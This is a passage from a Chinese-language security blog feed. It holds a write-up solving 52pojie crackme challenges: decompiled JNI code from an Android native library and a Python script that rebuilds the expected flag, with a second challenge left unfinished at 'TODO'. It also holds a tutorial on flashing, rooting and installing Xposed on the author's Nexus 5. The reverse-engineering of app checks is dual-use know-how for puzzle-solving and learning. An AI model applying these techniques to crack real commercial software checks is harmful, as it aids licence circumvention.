int))env_-&gt;functions-&gt;NewByteArray)(env_, 8);      if ( !((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )      {        v6 = 0;        ((void (__fastcall *)(_JNIEnv *, int, _DWORD, signed int, char *))env_-&gt;functions-&gt;SetByteArrayRegion)(          env_,          key3,          0,          8,          &quot;20200125&quot;);                          // key3 = &quot;20200125&quot;</code></pre><p>然后新建了一个 35 位的 Byte 数组，做一个循环，当 i 不为 0 且 i 是 4 的倍数时，下标设置为 <code>(i &gt;&gt; 2) - 1</code>，取 key3 中的值来 append 到数组中；反之，下标设置为 i，取 key2 中的值来 append 到数组中：</p><pre><code class="cpp">        arr = ((int (__fastcall *)(_JNIEnv *, signed int))env_-&gt;functions-&gt;NewByteArray)(env_, 35);        if ( !((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )        {          i = 0;          arr_ = arr;          key1_ = key1;          do          {            if ( !i || i &amp; 3 )            {              if ( !key2 )                goto LABEL_41;              pointer = key2;              i_ = i;              GetByteArrayRegion_ = env_-&gt;functions-&gt;GetByteArrayRegion;            }            else                                // if i != 0 and i % 4 == 0            {              pointer = key3;              if ( !key3 )                goto LABEL_41;              GetByteArrayRegion_ = env_-&gt;functions-&gt;GetByteArrayRegion;              i_ = (i &gt;&gt; 2) - 1;                // 0,1,2,3,4,5,6,7            }            ((void (__fastcall *)(_JNIEnv *, int, int, signed int, unsigned int))GetByteArrayRegion_)(              env_,              pointer,              i_,              1,              t1);            key1 = (unsigned __int8)t_;            if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )              goto LABEL_4;            if ( !arr_ )            {LABEL_41:              sub_4EC0(env_, &quot;java/lang/NullPointerException&quot;, &quot;NullPointerException&quot;);              goto LABEL_4;            }            LOBYTE(t_) = key1;            ((void (__fastcall *)(_JNIEnv *, int, unsigned int, signed int, unsigned int))env_-&gt;functions-&gt;SetByteArrayRegion)(              env_,              arr_,              i,              1,              t1);            if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )              goto LABEL_4;          }          while ( i++ &lt; 0x22 );                 // for i in range(35)</code></pre><p>接下来对 byte 数组进行 MD5 哈希，然后取摘要生成 16 位的 byte 数组：</p><pre><code class="cpp">          md5Str = ((int (__fastcall *)(_JNIEnv *, const char *))env_-&gt;functions-&gt;NewStringUTF)(env_, &quot;MD5&quot;);          if ( !v47 )          {            method2.name = &quot;getInstance&quot;;            method2.signature = &quot;(Ljava/lang/String;)Ljava/security/MessageDigest;&quot;;            if ( getMethods(env_, &amp;v52, &amp;v47, 1, &quot;java/security/MessageDigest&quot;, method2) )              goto LABEL_88;          }          t_ = md5Str;          v18 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallStaticObjectMethodA)(env_, v52);// md5 function          if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )            goto LABEL_88;          if ( md5Str )            ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, md5Str);          if ( !v18 )          {LABEL_87:            sub_4EC0(env_, &quot;java/lang/NullPointerException&quot;, &quot;NullPointerException&quot;);            goto LABEL_88;          }          if ( !v46 )          {            method2.name = &quot;digest&quot;;            method2.signature = &quot;([B)[B&quot;;            if ( getMethods(env_, &amp;v52, &amp;v46, 0, &quot;java/security/MessageDigest&quot;, method2) )              goto LABEL_88;          }          t_ = arr_;          md5Digest = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v18);// get hash digest          if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )            goto LABEL_88;          ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v18);          if ( !md5Digest )            goto LABEL_87;</code></pre><p>然后做一个循环，对数组中的元素和 key1 进行逐位异或：</p><pre><code class="cpp">          len = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;GetArrayLength)(env_, md5Digest);          if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )            goto LABEL_88;          idx = 0;          while ( 1 )                           // for i in range(16)          {            t1 = 0x38E38E39 * (unsigned __int64)(unsigned int)idx &gt;&gt; 32;// div 9? useless            if ( idx &gt;= len )              break;            ((void (__fastcall *)(_JNIEnv *, int, int, signed int, int *))env_-&gt;functions-&gt;GetByteArrayRegion)(              env_,              md5Digest,              idx,              1,              &amp;t_);            key1 = (unsigned __int8)t_;            if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )              goto LABEL_88;            if ( !key1_ )              goto LABEL_87;            ((void (__fastcall *)(_JNIEnv *, int, unsigned int, signed int, int *))env_-&gt;functions-&gt;GetByteArrayRegion)(              env_,              key1_,              idx % 9u,                         // mod 9              1,              &amp;t_);            ch = t_;            if ( !((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )            {              LOBYTE(t_) = ch ^ key1;           // xor              ((void (__fastcall *)(_JNIEnv *, int, int, signed int, int *))env_-&gt;functions-&gt;SetByteArrayRegion)(                env_,                md5Digest,                idx,                1,                &amp;t_);              if ( !((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )              {                len = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;GetArrayLength)(env_, md5Digest);                ++idx;                if ( !((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )                  continue;              }            }            goto LABEL_88;          }</code></pre><p>接下来，将得到的 byte 数组逐位转成 hex 字符串，如果小于 0xF，即只有一位，高位补 0。将结果逐位 append 到一个新的字符串中，得到一个 32 位的字符串：</p><pre><code class="cpp">          len__ = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;GetArrayLength)(env_, md5Digest);          if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )            goto LABEL_88;          if ( len__ &gt;= 1 )          {            j = 0;            classInteger = &quot;java/lang/Integer&quot;;            toHexString_ = &quot;toHexString&quot;;            method2.fnPtr = &quot;(I)Ljava/lang/String;&quot;;            zeroPad = 0;            while ( 1 )            {              ((void (__fastcall *)(_JNIEnv *, int, int, signed int, int *))env_-&gt;functions-&gt;GetByteArrayRegion)(                env_,                md5Digest,                j,                1,                &amp;t_);              t1 = (unsigned __int8)t_;              if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )                break;              if ( t1 &lt;= 0xF )                  // if x &lt; 0xF then append a zero              {                if ( zeroPad )                  ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, zeroPad);                zeroPad = ((int (__fastcall *)(_JNIEnv *, const char *))env_-&gt;functions-&gt;NewStringUTF)(env_, &quot;0&quot;);                if ( !v44 )                {                  method2.name = &quot;append&quot;;                  method2.signature = &quot;(Ljava/lang/String;)Ljava/lang/StringBuilder;&quot;;                  if ( getMethods(env_, &amp;v51, &amp;v44, 0, &quot;java/lang/StringBuilder&quot;, method2) )                    break;                }                t_ = zeroPad;                v24 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v22);// append zero                if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )                  break;                if ( v24 )                  ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v24);              }              if ( !v43 )              {                *(_QWORD *)&amp;method2.name = __PAIR__((unsigned int)method2.fnPtr, (unsigned int)toHexString_);                if ( getMethods(env_, &amp;v50, &amp;v43, 1, classInteger, method2) )// get toHexString method                  break;              }              t_ = t1;              t1 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallStaticObjectMethodA)(env_, v50);              if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )                break;              if ( arr_ )                ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, arr_);              if ( !v44 )              {                method2.name = &quot;append&quot;;                method2.signature = &quot;(Ljava/lang/String;)Ljava/lang/StringBuilder;&quot;;                if ( getMethods(env_, &amp;v51, &amp;v44, 0, &quot;java/lang/StringBuilder&quot;, method2) )                  break;              }              t_ = t1;              key1 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v22);              if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )                break;              if ( key1 )                ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, key1);              ++j;              arr_ = t1;              if ( j &gt;= len__ )                goto LABEL_75;            }</code></pre><p>最后将取字符串字符串的 1~31 位作为新的字符串，并与我们的输入进行比较：</p><pre><code class="cpp">if ( !v42 )          {            method2.name = &quot;toString&quot;;            method2.signature = &quot;()Ljava/lang/String;&quot;;            if ( getMethods(env_, &amp;v51, &amp;v42, 0, &quot;java/lang/StringBuilder&quot;, method2) )              goto LABEL_88;          }          v25 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v22);// convert StringBuilder to string          if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )            goto LABEL_88;          ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v22);          if ( !v25 )            goto LABEL_87;          if ( !v41 )          {            method2.name = &quot;substring&quot;;            method2.signature = &quot;(II)Ljava/lang/String;&quot;;            if ( getMethods(env_, &amp;v49, &amp;v41, 0, &quot;java/lang/String&quot;, method2) )              goto LABEL_88;          }          v55 = 31;                             // slice 1-31          t_ = 1;          v26 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v25);          if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )            goto LABEL_88;          ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v25);          if ( !v26 )            goto LABEL_87;          if ( !v40 )          {            method2.name = &quot;equals&quot;;            method2.signature = &quot;(Ljava/lang/Object;)Z&quot;;            if ( getMethods(env_, &amp;v49, &amp;v40, 0, &quot;java/lang/String&quot;, method2) )              goto LABEL_88;          }          t_ = v39;          v6 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallBooleanMethodA)(env_, v26);// compare string          if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )            goto LABEL_88;</code></pre><p>只需要正向地实现就能得到对应的字符串，我这里用 Python 实现了一下：</p><pre><code class="python">#!/usr/bin/env pythonimport hashlibkey = &#39;thisiskey52pojie_2020_happy_chinese_new_year20200125&#39;key1 = key[:0x7D-0x74]key2 = key[0x7D-0x74:0xA0-0x74]key3 = key[0xA0-0x74:]arr = &#39;&#39;for i in range(35):    if not i or i &amp; 3:        arr += key2[i]    else:        arr += key3[(i &gt;&gt; 2) - 1]print arrmd5str = hashlib.md5(arr).digest()print md5str.encode(&#39;hex&#39;)xorlist = []for i in range(16):    xorlist.append(ord(key1[i % 9]) ^ ord(md5str[i]))print xorlistflag = &#39;&#39;for i in range(16):    flag += hex(xorlist[i])[2:].zfill(2)print flagflag = flag[1:31]print flagassert len(flag) == 30</code></pre><p>跑出来后在手机上验证一下结果的正确性：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/10.png" srcset="/img/loading.gif" alt></p><p>回复公众号得到口令：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/11.jpg" srcset="/img/loading.gif" alt></p><h1 id="【春节】解题领红包之四"><a href="#【春节】解题领红包之四" class="headerlink" title="【春节】解题领红包之四"></a>【春节】解题领红包之四</h1><p>用 jadx 分析，在 <code>onCreate()</code> 函数中，需要输入 uid 和目标字符串，其中 uid 用 0 补齐成 7 位。然后调用在 Native 层实现的 <code>checkSn()</code> 函数：</p><pre><code class="java">package com.wuaipojie.crackme02;import android.os.Bundle;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;import androidx.appcompat.app.AppCompatActivity;public class MainActivity extends AppCompatActivity {    private Button btn;    private EditText input_flag;    private EditText input_uid;    public native boolean checkSn(String str, String str2);    static {        System.loadLibrary(&quot;xtian&quot;);    }    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView((int) R.layout.activity_main);        this.input_uid = (EditText) findViewById(R.id.input_uid);        this.input_flag = (EditText) findViewById(R.id.input_flag);        Button button = (Button) findViewById(R.id.button);        this.btn = button;        button.setOnClickListener(new OnClickListener() {            public void onClick(View view) {                view = MainActivity.this.input_uid.getText().toString().trim();                if (view.length() &lt; 7) {                    int length = 7 - view.length();                    StringBuilder stringBuilder = new StringBuilder();                    for (int i = 0; i &lt; length; i++) {                        stringBuilder.append(&quot;0&quot;);                    }                    StringBuilder stringBuilder2 = new StringBuilder();                    stringBuilder2.append(stringBuilder.toString());                    stringBuilder2.append(view);                    view = stringBuilder2.toString();                }                MainActivity mainActivity = MainActivity.this;                if (mainActivity.checkSn(view, mainActivity.input_flag.getText().toString().trim()) != null) {                    Toast.makeText(MainActivity.this, &quot;\u6b63\u786e\uff01\uff01\uff01\u8bf7\u628a\u7ed3\u679c\u76f4\u63a5\u63d0\u4ea4\u5230\u8bba\u575b\u9886\u53d6\u5956\u52b1\u5427&quot;, 0).show();                } else {                    Toast.makeText(MainActivity.this, &quot;\u9a8c\u8bc1\u9519\u8bef\uff0c\u7ee7\u7eed\u52a0\u6cb9&quot;, 0).show();                }            }        });    }}</code></pre><p>把 unicode 输出，可以看到通过了 <code>checkSn</code> 的检测就成功了：</p><pre><code class="ipython">In [1]: print u&quot;\u6b63\u786e\uff01\uff01\uff01\u8bf7\u628a\u7ed3\u679c\u76f4\u63a5\u63d0\u4ea4\u5230\u8bba\u575b\u9886\u53d6\u5956\u52b1\u5427&quot;正确！！！请把结果直接提交到论坛领取奖励吧In [2]: print u&quot;\u9a8c\u8bc1\u9519\u8bef\uff0c\u7ee7\u7eed\u52a0\u6cb9&quot;验证错误，继续加油</code></pre><p>接下来打开 IDA 分析一下 so 文件。没有找到 checkSn 函数，基本上都被混淆了，说明函数是被动态注册的。JNI_OnLoad 的部分：</p><pre><code class="cpp">void __fastcall __noreturn JNI_OnLoad(_JavaVM *vm){  _JavaVM *vm_; // r11  signed int v2; // r2  int v3; // lr  int (__fastcall *v4)(_JavaVM *, int *, signed int); // r4  int v5; // lr  signed int i; // r12  int v7; // [sp+8h] [bp-C0h]  int *v8; // [sp+10h] [bp-B8h]  int v9; // [sp+18h] [bp-B0h]  int v10; // [sp+20h] [bp-A8h]  int v11; // [sp+28h] [bp-A0h]  int v12; // [sp+30h] [bp-98h]  int *v13; // [sp+38h] [bp-90h]  int v14; // [sp+40h] [bp-88h]  signed int v15; // [sp+48h] [bp-80h]  int v16; // [sp+50h] [bp-78h]  int *v17; // [sp+7Ch] [bp-4Ch]  void *v18; // [sp+80h] [bp-48h]  int *v19; // [sp+84h] [bp-44h]  int *v20; // [sp+88h] [bp-40h]  int *v21; // [sp+8Ch] [bp-3Ch]  int *v22; // [sp+90h] [bp-38h]  int *v23; // [sp+94h] [bp-34h]  int *v24; // [sp+98h] [bp-30h]  void **v25; // [sp+9Ch] [bp-2Ch]  signed int *v26; // [sp+A0h] [bp-28h]  vm_ = vm;  v23 = &amp;Oo0O_8;  v24 = &amp;O0OO_9;  v18 = &amp;_stack_chk_guard;  v2 = 0;  if ( O0OO_9 &lt; 10 )    v2 = 1;  v3 = v2 | ~((Oo0O_8 - 1) * Oo0O_8) &amp; 1;  if ( v3 != 1 )    goto LABEL_5;  while ( 1 )  {    v26 = &amp;v15;    v15 = 0x58D3C185;    v12 = 0x58D3C185;    v13 = &amp;v10;    if ( v3 )    {      v22 = &amp;v11;      v17 = (int *)&amp;v13;      v20 = &amp;v16;      v21 = &amp;v12;      v4 = (int (__fastcall *)(_JavaVM *, int *, signed int))(*((_DWORD *)off_1D7B0 + 0x1FEC2733) - 0x58D3C184);      v14 = v4(vm, &amp;v10, 0x10004);      v5 = *v23;      for ( i = *v24; *v24 &gt;= 10 &amp;&amp; ((_BYTE)v5 - 1) * (_BYTE)v5 &amp; 1; i = *v24 )      {        v14 = v4(vm_, &amp;v10, 0x10004);        v14 = v4(vm_, &amp;v10, 0x10004);        v5 = *v23;      }      v19 = &amp;v14;      v25 = &amp;off_1D7B0;      if ( i &lt; 10 || !(((_BYTE)v5 - 1) * (_BYTE)v5 &amp; 1) )        JUMPOUT(__CS__, *((_DWORD *)off_1D7B4 + 0x1FEC27A2) - 0x49F16B40);      while ( 1 )        ;    }LABEL_5:    v9 = 0x58D3C185;    v8 = &amp;v7;  }}</code></pre><p>TODO:</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.52pojie.cn/thread-732955-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-732955-1-1.html</a><br><a href="https://www.52pojie.cn/thread-749955-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-749955-1-1.html</a><br><a href="https://stackoverflow.com/questions/27260524/need-explanation-on-assembly-instructions-of-kr-fahr-to-cels-example" target="_blank" rel="noopener">https://stackoverflow.com/questions/27260524/need-explanation-on-assembly-instructions-of-kr-fahr-to-cels-example</a><br><a href="https://www.52pojie.cn/thread-1101266-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-1101266-1-1.html</a><br><a href="https://www.bodkin.ren/index.php/archives/533/" target="_blank" rel="noopener">https://www.bodkin.ren/index.php/archives/533/</a><br><a href="https://www.52pojie.cn/thread-778654-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-778654-1-1.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;第二次参加领红包活动，这次有两题是 apk。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
      <category term="wp" scheme="blog.b3ale.cn/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Nexus5刷机、Root并安装Xposed框架</title>
    <link href="blog.b3ale.cn/2020/02/05/Nexus5%E5%88%B7%E6%9C%BA%E3%80%81Root%E5%B9%B6%E5%AE%89%E8%A3%85Xposed%E6%A1%86%E6%9E%B6/"/>
    <id>blog.b3ale.cn/2020/02/05/Nexus5%E5%88%B7%E6%9C%BA%E3%80%81Root%E5%B9%B6%E5%AE%89%E8%A3%85Xposed%E6%A1%86%E6%9E%B6/</id>
    <published>2020-02-05T06:59:47.000Z</published>
    <updated>2020-03-20T02:07:06.263Z</updated>
    
    <content type="html"><![CDATA[<p>在闲鱼上从羊毛党那里买了部 Nexus 5（代号 hammerhead），记录第一次尝试刷机和 root（一开始不是很懂各种知识，所以没有记录下原本系统的版本等各种信息）。</p><a id="more"></a><p>查看设备名称：</p><pre><code class="bash">shell@hammerhead:/ $ getprop ro.product.devicehammerhead</code></pre><h1 id="解锁"><a href="#解锁" class="headerlink" title="解锁"></a>解锁</h1><p>先使用 adb 命令进入 bootloader 模式：</p><pre><code class="bash">$ adb reboot bootloader</code></pre><p><img src="/pics/Nexus5刷机、Root并安装Xposed框架/1.png" srcset="/img/loading.gif" alt></p><p>这部机子一开始已经解锁了，所以会报错：</p><pre><code class="bash">$ fastboot oem unlock                                                   FAILED (remote: &#39;Already Unlocked&#39;)fastboot: error: Command failed</code></pre><h1 id="刷机"><a href="#刷机" class="headerlink" title="刷机"></a>刷机</h1><p>刷机一般是采用<a href="https://developers.google.com/android/images" target="_blank" rel="noopener">官方的镜像</a>，搜索 hammerhead，找到需要刷的版本。我一开始用了 Android 5.0.1（LRX22C）的包，但一直没有成功。后来改成低版本的 Android 4.4.3（KTU84M）后，刷机成功。同样需要使用 adb 命令进入 bootloader 界面（也可以使用音量下键+电源键），然后确认有设备后执行镜像包中的 <code>flash-all.sh</code>：</p><pre><code class="bash">$ adb reboot bootloader$ fastboot devices0b83c85e00ce15f9    fastboot$ ./flash-all.shSending &#39;bootloader&#39; (2508 KB)                     OKAY [  0.290s]Writing &#39;bootloader&#39;                               OKAY [  0.497s]Finished. Total time: 0.981sRebooting into bootloader                          OKAY [  0.094s]Finished. Total time: 0.094sSending &#39;radio&#39; (45409 KB)                         OKAY [  1.640s]Writing &#39;radio&#39;                                    OKAY [  3.105s]Finished. Total time: 4.975sRebooting into bootloader                          OKAY [  0.106s]Finished. Total time: 0.106s--------------------------------------------Bootloader Version...: HHZ11kBaseband Version.....: M8974A-2.0.50.1.13Serial Number........: 0b83c85e00ce15f9--------------------------------------------extracting android-info.txt (0 MB) to RAM...Checking &#39;product&#39;                                 OKAY [  0.097s]Checking &#39;version-bootloader&#39;                      OKAY [  0.100s]Checking &#39;version-baseband&#39;                        OKAY [  0.100s]extracting boot.img (8 MB) to disk... took 0.038sarchive does not contain &#39;boot.sig&#39;Sending &#39;boot&#39; (8700 KB)                           OKAY [  0.490s]Writing &#39;boot&#39;                                     OKAY [  0.749s]archive does not contain &#39;dtbo.img&#39;archive does not contain &#39;dt.img&#39;extracting recovery.img (9 MB) to disk... took 0.039sarchive does not contain &#39;recovery.sig&#39;Sending &#39;recovery&#39; (9284 KB)                       OKAY [  0.510s]Writing &#39;recovery&#39;                                 OKAY [  0.776s]archive does not contain &#39;vbmeta.img&#39;archive does not contain &#39;vbmeta_system.img&#39;archive does not contain &#39;super_empty.img&#39;archive does not contain &#39;odm.img&#39;archive does not contain &#39;product.img&#39;extracting system.img (704 MB) to disk... took 3.704sarchive does not contain &#39;system.sig&#39;Sending &#39;system&#39; (721400 KB)                       OKAY [ 22.834s]Writing &#39;system&#39;                                   OKAY [ 49.509s]archive does not contain &#39;system_ext.img&#39;archive does not contain &#39;vendor.img&#39;Erasing &#39;userdata&#39;                                 OKAY [ 15.664s]mke2fs 1.44.4 (18-Aug-2018)Creating filesystem with 7137786 4k blocks and 1785856 inodesFilesystem UUID: bc382e9c-a2d8-4adc-860a-6a31fcf236c3Superblock backups stored on blocks:    32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632, 2654208,    4096000Allocating group tables: doneWriting inode tables: doneCreating journal (32768 blocks): doneWriting superblocks and filesystem accounting information: doneSending &#39;userdata&#39; (4416 KB)                       OKAY [  0.244s]Writing &#39;userdata&#39;                                 OKAY [  0.495s]Erasing &#39;cache&#39;                                    OKAY [  0.600s]mke2fs 1.44.4 (18-Aug-2018)Creating filesystem with 179200 4k blocks and 44832 inodesFilesystem UUID: 773d6dcf-5df9-40ae-8ffc-9f7f947e275dSuperblock backups stored on blocks:    32768, 98304, 163840Allocating group tables: doneWriting inode tables: doneCreating journal (4096 blocks): doneWriting superblocks and filesystem accounting information: doneSending &#39;cache&#39; (428 KB)                           OKAY [  0.211s]Writing &#39;cache&#39;                                    OKAY [  0.219s]Rebooting                                          OKAY [  0.100s]Finished. Total time: 100.120s</code></pre><p>完成后，如果没有什么故障，稍过片刻就能打开新的系统了。</p><blockquote><p>我刷完后的系统打开后只有 256MB 可用空间，搜了一下，需要在 recovery mode 下对 <code>/data</code> 和 <code>/cache</code> 进行格式化，照着<a href="https://jilu.wiki/d/177" target="_blank" rel="noopener">这篇文章</a>对系统进行双清后，容量恢复到了正常状态。</p></blockquote><p><img src="/pics/Nexus5刷机、Root并安装Xposed框架/2.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/Nexus5刷机、Root并安装Xposed框架/3.png" srcset="/img/loading.gif" alt></p><h1 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h1><p>刷完机后，可以进行 root 了。下载 Android Root 包 <a href="https://autoroot.chainfire.eu/" target="_blank" rel="noopener">CF-Auto-Root-hammerhead-hammerhead-nexus5.zip</a> 并解压进入目录。在 macOS 下时，提供的 fastbootm-mac 的版本过老，使用时会报错：</p><pre><code>$ tools/fastboot-mac --versionfastboot version 09a0d98bebce-android</code></pre><p>本地的 fastboot 版本更新，所以我把 tools 中的工具替换为了本地的 /usr/local/bin/fastboot：</p><pre><code>$ fastboot --versionfastboot version 29.0.2-5738569Installed as /usr/local/bin/fastboot</code></pre><p>然后进入 bootloader，并执行 root-mac.sh：</p><pre><code>$ adb reboot bootloader$ ./root-mac.sh----- CF-Auto-Root-hammerhead-hammerhead-nexus5 -----If you are on Android 5.0 or newer, please make sure the &quot;Allow OEM Unlock&quot;option (if present) is enabled in &quot;Settings-&gt;Developer Options&quot;.If you cannot find &quot;Developer Options&quot; under &quot;Settings&quot;, first go to the&quot;Settings-&gt;About&quot; screen, find the &quot;Build number&quot; entry, and tap it 7 times.----- ----- ----- ----- ----- ----- -----Please make sure your device is in bootloader/fastboot mode before continuing.----- ----- ----- ----- ----- ----- -----***WARNING*** ALL YOUR DATA *MAY* BE WIPED ! ***WARNING***We are going to run the &quot;OEM UNLOCK&quot; command on your device. If your devicewas not previously unlocked, this will wipe all your data !Please watch the screen on your device, user input may be required.You may need to enter your administrator password to continue.Press Ctrl+C to cancel !Press ENTER to continuePassword:----- ----- ----- ----- ----- ----- -----If you just unlocked for the first time, it is advised to boot the device intoAndroid before continuing. This first boot may take several minutes, sometimeseven half an hour.If you decide to boot back into Android first, return your device tobootloader/fastboot mode before continuing again.Press Ctrl+C to cancel !Press ENTER to continue----- ----- ----- ----- ----- ----- -----We will now attempt to boot CF-Auto-Root. You should see a red Android on thescreen of your device in a minute, with scrolling white text on top of it.Sending &#39;boot.img&#39; (15868 KB)                      OKAY [  0.605s]Booting                                            OKAY [  0.121s]Finished. Total time: 0.747sIf nothing happens even after several minutes, something may be wrong.Once CF-Auto-Root is done, it will reboot your device. Keep in mind that yourdevice may reboot a number of times, and it may be a few minutes before youare back into Android. It is important that you do not interrupt this process,unless it takes more than five minutes in total.Press ENTER to continue</code></pre><p>成功后，手机会出现一个红色的安卓标志：</p><p><img src="/pics/Nexus5刷机、Root并安装Xposed框架/4.png" srcset="/img/loading.gif" alt></p><p>打开手机后，会发现多了一个 app 叫 SuperSu。使用 adb 连接，并用 su 命令切换到 root：</p><pre><code>$ adb shellshell@hammerhead:/ $ suroot@hammerhead:/ # iduid=0(root) gid=0(root) context=u:r:init:s0root@hammerhead:/ #</code></pre><h1 id="TWRP"><a href="#TWRP" class="headerlink" title="TWRP"></a>TWRP</h1><p>下载 <a href="https://twrp.me/lg/lgnexus5.html" target="_blank" rel="noopener">twrp-3.3.1-0-hammerhead.img</a>，进入 bootloader，并用 fastboot 刷入这个第三方 Recovery，然后重启：</p><pre><code>$ adb reboot bootloader$ fastboot flash recovery twrp-3.3.1-0-hammerhead.imgSending &#39;recovery&#39; (13290 KB)                      OKAY [  0.630s]Writing &#39;recovery&#39;                                 OKAY [  1.040s]Finished. Total time: 1.863s$ fastboot rebootRebooting                                          OKAY [  0.001s]Finished. Total time: 0.001s</code></pre><h1 id="Xposed"><a href="#Xposed" class="headerlink" title="Xposed"></a>Xposed</h1><p>Android 4.0.3~Android 4.4 的版本不支持 sdk21 及以上的版本，通过直接下载 <a href="https://repo.xposed.info/module/de.robv.android.xposed.installer" target="_blank" rel="noopener">Xposed Installer</a> 来安装 Xposed 框架：</p><pre><code>$ adb install apks/de.robv.android.xposed.installer_v33_36570c.apkPerforming Push Installapks/de.robv.android.xposed.installer_v33_36570c.apk: 1 file pushed. 6.7 MB/s (788771 bytes in 0.113s)    pkg: /data/local/tmp/de.robv.android.xposed.installer_v33_36570c.apkSuccess</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.bodkin.ren/index.php/archives/513/" target="_blank" rel="noopener">https://www.bodkin.ren/index.php/archives/513/</a><br><a href="https://jilu.wiki/d/177" target="_blank" rel="noopener">https://jilu.wiki/d/177</a><br><a href="https://blog.csdn.net/feiniao8651/article/details/70083246/" target="_blank" rel="noopener">https://blog.csdn.net/feiniao8651/article/details/70083246/</a><br><a href="https://forum.xda-developers.com/general/xda-assist/xposed-sdk-19-t3311193" target="_blank" rel="noopener">https://forum.xda-developers.com/general/xda-assist/xposed-sdk-19-t3311193</a><br><a href="https://sspai.com/post/24538" target="_blank" rel="noopener">https://sspai.com/post/24538</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在闲鱼上从羊毛党那里买了部 Nexus 5（代号 hammerhead），记录第一次尝试刷机和 root（一开始不是很懂各种知识，所以没有记录下原本系统的版本等各种信息）。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
      <category term="android" scheme="blog.b3ale.cn/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向入门（二）</title>
    <link href="blog.b3ale.cn/2020/01/31/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>blog.b3ale.cn/2020/01/31/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2020-01-31T08:10:49.000Z</published>
    <updated>2020-03-20T02:19:38.060Z</updated>
    
